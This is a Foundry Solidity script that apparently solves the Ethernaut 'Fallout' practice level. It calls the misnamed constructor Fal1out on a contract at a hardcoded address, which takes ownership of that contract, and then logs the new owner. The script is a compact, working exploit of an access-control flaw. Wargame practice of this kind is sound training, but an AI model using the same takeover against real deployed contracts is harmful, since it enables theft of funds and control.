// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallout.sol";

contract Level2Solution is Script{

Fallout public fallout1 = Fallout(payable(0xA0348167F473F8B76d5cCf99db641517A10D92A6 ));

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallout1.Fal1out{value: 1 wei}();
        
        console.log("my:" ,vm.envAddress("MY_ADDRESS"));
        console.log("new:" ,fallout1.owner());

        vm.stopBroadcast();
    }

}
